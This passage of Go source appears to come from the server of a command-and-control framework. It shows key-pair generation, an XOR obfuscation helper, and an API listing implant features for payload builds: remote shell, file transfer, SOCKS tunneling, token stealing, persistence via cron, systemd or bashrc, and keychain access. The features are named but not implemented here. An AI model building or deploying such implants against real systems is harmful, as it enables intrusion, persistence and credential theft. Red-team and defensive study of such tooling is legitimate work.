		Bytes: privateKeyBytes,
	})

	// Encode public key - use PKCS1 format (RSA PUBLIC KEY) to match WebSocket service
	publicKeyBytes := x509.MarshalPKCS1PublicKey(&privateKey.PublicKey)
	publicKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: publicKeyBytes,
	})

	return &KeyPair{
		// Base64 encode private key to match WebSocket service format
		PrivateKeyPEM: base64.StdEncoding.EncodeToString(privateKeyPEM),
		PublicKeyPEM:  string(publicKeyPEM),
	}, nil
}

func xorEncrypt(plaintext, key string) string {
	result := make([]byte, len(plaintext))
	for i := 0; i < len(plaintext); i++ {
		result[i] = plaintext[i] ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(result)
}

// Feature definitions for modular payload builds
type FeatureInfo struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	OS          string `json:"os"`
}

var allFeatures = []FeatureInfo{
	{Name: "shell", Description: "Shell command execution", OS: "all"},
	{Name: "download", Description: "File download from target", OS: "all"},
	{Name: "upload", Description: "File upload to target", OS: "all"},
	{Name: "socks", Description: "SOCKS proxy tunneling", OS: "all"},
	{Name: "link", Description: "Agent linking (SMB/TCP child agents)", OS: "all"},
	{Name: "bof", Description: "Beacon Object File execution", OS: "windows"},
	{Name: "assembly", Description: ".NET inline assembly execution", OS: "windows"},
	{Name: "token", Description: "Token manipulation (make/steal/rev2self)", OS: "windows"},
	{Name: "sudo", Description: "Sudo session management", OS: "linux,darwin"},
	{Name: "persist", Description: "Persistence (systemd, cron, bashrc, launchd)", OS: "linux,darwin"},
	{Name: "keychain", Description: "Keychain access", OS: "darwin"},
}

func getValidFeatures(osName string) map[string]bool {
	valid := make(map[string]bool)
	for _, f := range allFeatures {
		if f.OS == "all" || strings.Contains(f.OS, osName) {
			valid[f.Name] = true
		}
	}
	return valid
}

// GetFeatures returns available features for a given OS
// GET /api/v1/payloads/features?os=windows
func (h *PayloadHandler) GetFeatures(c *gin.Context) {
	osParam := strings.ToLower(c.DefaultQuery("os", ""))

	var features []FeatureInfo
	for _, f := range allFeatures {
		if osParam == "" || f.OS == "all" || strings.Contains(f.OS, osParam) {
			features = append(features, f)
		}
	}

	c.JSON(http.StatusOK, gin.H{"features": features})
}
